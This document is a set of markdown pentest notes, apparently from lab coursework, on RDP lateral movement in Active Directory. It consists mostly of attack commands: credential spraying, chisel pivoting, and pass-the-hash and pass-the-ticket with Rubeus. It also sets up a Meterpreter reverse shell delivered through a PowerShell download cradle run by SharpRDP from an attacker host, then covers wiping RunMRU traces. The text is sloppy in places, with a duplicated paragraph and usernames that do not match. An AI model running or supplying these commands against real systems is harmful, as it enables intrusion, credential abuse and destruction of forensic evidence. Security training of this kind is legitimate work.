# Remote Desktop Service (RDP)

## RDP Rights
The required rights to connect to RDP depend on the configuration; by default, only members of the `Administrators` or `Remote Desktop Users` groups can connect via RDP. Additionally, an administrator can grant specific users or groups rights to connect to RDP.
## RDP Enumeration
we can use that list with tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) to test multiple credentials.
```shell
netexec rdp 10.129.229.0/24 -u <user> -p <password> -d domain.local
```
## Lateral Movement From Windows
To connect to RDP from Windows we can use the default windows `Remote Desktop Connection` client that can be accessed by running `mstsc` on Run, Cmd or PowerShell:
```powershell
mstsc.exe
```
## Lateral Movement From Linux
```shell
xfreerdp /u:Ahmed /p:'P@ssword' /d:domain.local /v:10.129.191.83 /dynamic-resolution /drive:.,linux
```
### Optimizing xfreerdp for Low Latency Networks or Proxy Connections
```shell
xfreerdp3 /u:Ahmed /p:'P@ssword' /d:domain.local /v:10.129.191.83 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```
## Restricted Admin Mode
Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system.
This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.

To confirm if `Restricted Admin Mode` is enabled, we can query the following registry key:
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:

- If the value is `0`, `Restricted Admin Mode` is enabled.
- If the value is `1`, `Restricted Admin Mode` is disabled.
If the key does not exist it means that is disabled and, we will see the following error message:
```css
ERROR: The system was unable to find the specified registry key or value.
```

To enable `Restricted Admin Mode`, we would set the `DisableRestrictedAdmin` value to `0`. Here is the command to enable it:
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```
And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value to `1`:
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
```

# RDP Pivoting


To connect to the other machines from our Linux attack host, we will need to set up a pivot method; in this case, we will use [chisel](https://github.com/jpillora/chisel). [[chisel]]
On Kali
```shell
./chisel server --reverse
```

Then, in `SRV01`, we will connect to the server with the following command `chisel.exe client <VPN IP> R:socks`:
```powershell
.\chisel.exe client 10.10.16.57:8080 R:socks
```
From kali machine we can connect to the other server with rdp pivoting
```shell
proxychains4 -q xfreerdp3 /u:<User> /p:<Password> /d:<Domain> /v:<IP>
```
#### Pass the Hash and Pass the Ticket for RDP

Once we confirm `Restricted Admin Mode` is enabled, or if we can enable it, we can proceed to perform `Pass the Hash` or `Pass the Ticket` attacks with RDP.
To perform `Pass the Hash` from a Linux machine, we can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP. Here's an example command:

Once we confirm `Restricted Admin Mode` is enabled, or if we can enable it, we can proceed to perform `Pass the Hash` or `Pass the Ticket` attacks with RDP.

To perform `Pass the Hash` from a Linux machine, we can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP. Here's an example command:

  Remote Desktop Service (RDP)

```shell
proxychains4 -q xfreerdp3 /u:Ahmed /pth:62EBA30320E250ECA185AA1327E78AEB /d:<domain.local> /v:172.20.0.52
```

For `Pass the Ticket` we can use [Rubeus](https://github.com/GhostPack/Rubeus). We will forge a ticket using `Helen`'s hash. First we need to launch a sacrificial process with the option `createnetonly`:

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

- **`createnetonly`**: This is a Rubeus command that creates a new process with a "network only" logon session. This means the new process will not inherit any of the logged-on user's existing Kerberos tickets. It starts with a clean slate, which is essential for the next step.
    
- **`/program:powershell.exe`**: This specifies that the new process to be created is a PowerShell window.
    
- **`/show`**: This option makes the new PowerShell window visible to you, so you can interact with it.
    

This command essentially creates a clean, isolated environment to perform the attack without affecting or being affected by the current user's existing Kerberos tickets.

In the new PowerShell window we will use Helen's hash to forge a Ticket-Granting ticket (TGT):

```powershell
.\Rubeus.exe asktgt /user:Ahmed /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:domain.local /ptt
```
This is where the actual attack happens inside the new PowerShell window.

- **`asktgt`**: This Rubeus command requests a Ticket-Granting Ticket (TGT) from the Domain Controller. It's essentially the same as a legitimate Kerberos logon, but it uses a supplied hash instead of a password.
    
- **`/user:Ahmed`**: This specifies the user for whom you are requesting the TGT—in this case, "Helen".
    
- **`/rc4:62EBA30320E250ECA185AA1327E78AEB`**: This provides the NTLM hash of Helen's password. The `/rc4` flag indicates that you are providing the RC4-HMAC hash, which is the key needed to authenticate as the user Helen without having her plaintext password.
    
- **`/domain:domain-name.local`**: This specifies the Active Directory domain to which Helen belongs.
    
- **`/ptt` (Pass The Ticket)**: This is the core of the attack. It instructs Rubeus to take the newly forged TGT and inject it directly into the current logon session's memory. This makes the operating system believe that the current user (the new PowerShell process) has legitimately authenticated as Helen, allowing it to access network services and resources as her.

**From the window where we imported the ticket, we can use the `mstsc /restrictedAdmin` command:**

```powershell
mstsc.exe /restrictedAdmin
```
The `mstsc.exe /restrictedAdmin` command is a technique used to perform lateral movement via RDP after a successful credential theft attack, such as "Pass the Ticket." It allows an attacker to connect to a remote host using a Kerberos ticket already present in the current session's memory without exposing the account's password hash.
**`/restrictedAdmin`**: This is the crucial flag for this technique. It initiates a restricted admin mode RDP session. In this mode, the client's credentials are **not** sent to the remote host. Instead, the local session's Kerberos tickets are used for authentication.

By using this command after a "Pass the Ticket" attack (where a forged ticket has been injected into the current process's memory), you can connect to a remote machine as the impersonated user (e.g., "Helen" from your previous example). The RDP client will automatically use the forged Kerberos ticket in your memory to authenticate to the remote server, bypassing the need to supply a password or hash. This is a very stealthy technique because it prevents the remote host from caching the compromised user's password hash in memory (`lsass`), which is a common defense mechanism monitored by Blue Teams.

It will open a window as the currently logged-in user. It doesn't matter if the name is not the same as the account we are trying to impersonate.

# SharpRDP

[SharpRDP](https://github.com/0xthirteen/SharpRDP) is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the `mstscax.dll` library used by RDP clients. This tool can perform actions such as connecting, authenticating, executing commands, and disconnecting without needing a GUI client or SOCKS proxy.
**SharpRDP** relies on the terminal services library (`mstscax.dll`) and generates the required DLLs (`MSTSCLib.DLL` and `AxMSTSCLib.DLL`) from the `mstscax.dll`. It uses an invisible Windows form to handle the terminal services connection object instantiation and perform actions needed for lateral movement.

We will use Metasploit and PowerShell to execute commands on the target machine. In our Linux machine we will execute Metasploit to listen on port 8888:
```shell
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
```

Then we will generate a payload with msfvenom using PowerShell Reflection:
```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s
```

The `psh-reflection` format in `msfvenom` is used to generate a **reflective PowerShell payload**.
This format creates a PowerShell script that is designed to be executed directly in memory without ever touching the disk. It works by using a technique called **reflective DLL injection** to load the Meterpreter payload into the PowerShell process.
Next we use python http server to host our payload:
```shell
sudo python3 -m http.server 80
```
Now we can use `SharpRDP` to execute a powershell command to execute our payload and provide a session:
```powershell
.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=domain\Ahmed password=Password123
```
**Note:** The execution of commands of `SharpRDP` is limited to 259 characters.

`SharpRDP` uses Microsoft Terminal Services to execute commands, leaving traces of command execution within the `RunMRU` registry key (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` or `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`). We can use [CleanRunMRU](https://github.com/0xthirteen/CleanRunMRU) to clean all command records. To compile the tool, we can use the built-in Microsoft [csc](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/) compiler tool. First, let's transfer CleanRunMRU's `Program.cs` file from our attack host to the target computer:

```powershell
wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
```
Now we can use `csc.exe` to compile it:
```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
```
Now we can use `CleanRunMRU.exe` to clear all commands:
```powershell
.\CleanRunMRU.exe  clearall
```
